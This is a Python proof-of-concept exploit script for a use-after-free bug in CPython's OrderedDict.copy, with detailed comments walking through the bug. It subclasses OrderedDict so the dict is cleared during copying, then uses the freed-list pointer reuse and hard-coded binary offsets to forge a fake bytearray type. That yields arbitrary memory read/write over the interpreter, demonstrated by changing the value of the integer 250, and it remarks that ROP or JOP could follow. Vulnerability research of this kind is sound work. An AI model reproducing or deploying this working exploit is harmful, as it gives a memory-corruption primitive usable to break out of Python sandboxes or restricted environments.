"""
Author: @quasar098
Bug Credits: @jackfromeast
"""

# TLDR: UAF when OrderedDict is freed while copying
# Tested to work on 3.10.12, 3.13.10 (should theoretically work from 3.5.0 onwards)
# Exact python binary is required due to varying offsets (see constants below)

# Relevant github issue: https://github.com/python/cpython/issues/142734

# Here is the vulnerable code as of 3.13.10
# https://github.com/python/cpython/blob/v3.13.10/Objects/odictobject.c#L1239-L1250
"""
static PyObject *
odict_copy(register PyODictObject *od, PyObject *Py_UNUSED(ignored))
{
    _ODictNode *node;
    PyObject *od_copy;

    if (PyODict_CheckExact(od))
        od_copy = PyODict_New();
    else
        od_copy = _PyObject_CallNoArgs((PyObject *)Py_TYPE(od));
    if (od_copy == NULL)
        return NULL;

    if (PyODict_CheckExact(od)) {
        /* code not relevant for exploit */
    }
    else {
        _odict_FOREACH(od, node) {
            int res;
            PyObject *value = PyObject_GetItem((PyObject *)od,
                                               _odictnode_KEY(node));  // Let's free the underlying OrderedDict's nodes by using clear() method
            if (value == NULL)
                goto fail;
            res = PyObject_SetItem((PyObject *)od_copy,
                                   _odictnode_KEY(node), value);  // `node` is already freed.
                                                                  // We get the node->key and use it as a setitem key
            Py_DECREF(value);
            if (res != 0)
                goto fail;
        }
    }
    return od_copy;

fail:
    Py_DECREF(od_copy);
    return NULL;
}
"""

# relevant `_odictnode` struct definition
"""
struct _odictnode {     // Field offsets:
    PyObject *key;      // 0x0
    Py_hash_t hash;     // 0x8
    _ODictNode *next;   // 0x10
    _ODictNode *prev;   // 0x18
};
"""

from collections import OrderedDict
from common import evil_bytearray_obj
from time import sleep

# the reasoning for this is explained below
# can be set to any offset from python binary base containing "ret" instruction
HARMLESS_FUNCTION_OFFSET = 0x6d01a
# the offset from python binary base to None object
NONE_OBJ_OFFSET = 0x57f3e0


class Evil(OrderedDict):
    def __getitem__(self, key):
        # we want the dunder getitem to clear the OrderedDict object because that is the UAF
        if key == 1:
            super().clear()

# see ./common/common.py for evil bytearray obj explanation
# this also doubles as a temporary fake type required for its tp_hash
fake_obj_setup, _ = evil_bytearray_obj()

# harmless_func_addr is the offset from python base to the first "ret" instruction in the r-x section of python binary
# other "harmless" functions could be used alternatively to ret_addr such as `_PyToken_OneChar` or `PyBytes_AS_STRING`
# the "harmless" function must return a consistent value (since it's used as a hash function and we are messing with odict keys)
python_binary_base = id(None) - NONE_OBJ_OFFSET
harmless_func_addr = python_binary_base + HARMLESS_FUNCTION_OFFSET

# put tp_hash function as something harmless but that wont return varying values
fake_obj_setup = fake_obj_setup.ljust(0x78, b'\x00') + harmless_func_addr.to_bytes(8, 'little')

# one thing to know is that the OrderedDict is being iterated over during copying and that requires using `_odictnode`s.
# here, we have two `_odictnode`s to go through (see corrupted_obj below). the first one is harmless since
# the `__getitem__` of `Evil` doesn't do anything. the second one triggers the UAF. when the key is 1,
# the underlying `OrderedDict` object is cleared. clearing the object frees all the `_odictnode`s, causing a UAF during the setitem

# another thing to know is that python uses a simple singly linked list for its freed object pool. relevant snippet below
# https://github.com/python/cpython/blob/5d1e78f7b59ffa3308755b5b2e0f85eb0c6ac890/Objects/obmalloc.c#L2574-L2577
"""
    /* code before this not relevant */
    pymem_block *lastfree = pool->freeblock;
    *(pymem_block **)p = lastfree;
    pool->freeblock = (pymem_block *)p;
    pool->ref.count--;
    /* code after this not relevant */
"""
# when the two odictnodes are freed, that newly freed space is added to the free pool. specifically,
# the first node is freed, and then the second node is freed. this causes the `node->key` of the second
# node (the key:1,value:1 node) to point to the address of the first node, since the `node->key` field is
# at offset 0 in `_odictnode`, and that memory is being set to be the point to the next node by `*(pymem_block **)p = lastfree`.
# basically the first 8 bytes at second_node memory location at the offset 0 contains the address of `first_node`.
# so, `*second_node == second_node->key == first_node`. now that the second node's key points to the first node,
# when we get to `PyObject_SetItem((PyObject *)od_copy, _odictnode_KEY(node), value)`, the key used in the setitem is second_node->key
# i.e. `PyObject_SetItem((PyObject *)od_copy, _odictnode_KEY(second_node), value)` -> `PyObject_SetItem((PyObject *)od_copy, first_node, value)`.

# the next thing to know here is that the first node is not a PyObject as is intended for the type of the `key` argument of PyObject_SetItem.
# the first node is pretending to be a PyObject, but it is a odictnode. luckily, the code path for PyObject_SetItem only requires one thing
# of the key: it must be able to be `PyObject_Hash`'d. Looking at `PyObject_Hash`, the `Py_TYPE(first_node)->tp_hash` has to be not null,
# and it has to be some c function that when called with first_node returns any value
# https://github.com/python/cpython/blob/main/Objects/object.c#L1152-L1171
"""
Py_hash_t
PyObject_Hash(PyObject *v)
{
    PyTypeObject *tp = Py_TYPE(v);
    if (tp->tp_hash != NULL)
        return (*tp->tp_hash)(v);  // we just want this check to pass, doesn't matter what it does or
                                   // returns as long as its a consist return value and also harmless
    /* irrelevant code here omitted */
    return PyObject_HashNotImplemented(v);
}    
"""
# NOTE: potentially, you can skip the rest of the python exploitation and just do JOP or maybe ROP from this above function if needed
# here, `Py_TYPE(v) == v->ob_type`, which that field is at offset 0x8. this offset matches up with the offset 0x8 of first_node->hash
# fortunately, the hash of positive integers smaller than 2**61 - 1 (see https://docs.python.org/3/library/stdtypes.html#hashing-of-numeric-types)
# is always equal to the original integer. this means we can just place the address of our fake object as the first node's key, and the hash
# will still be equal to our fake object's address. the fake object doubles as a fake type with the type having a harmless tp_hash.

corrupted_obj = Evil([
    (id(fake_obj_setup) + bytes.__basicsize__ - 1, 0x1337),  # first node
    (1, 1)  # second node, triggers the UAF
]).copy()

# so after the UAF has been done, the corrupted_obj is a copy of Evil, but with the values replaced with None (see `__getitem__` of `Evil`), and
# the `1` key replaced with our fake object. this fake object has a ob_type that is our desired bytearray, so we win by getting it with type()

_, fake_obj = corrupted_obj.keys()  # fake object with everything garbage BUT it has our fake object as its type
mem = type(fake_obj)

print(type(mem))  # bytearray
print(hex(len(mem)))  # huge size

mem[id(250) + int.__basicsize__] = 100
print(250)  # 100
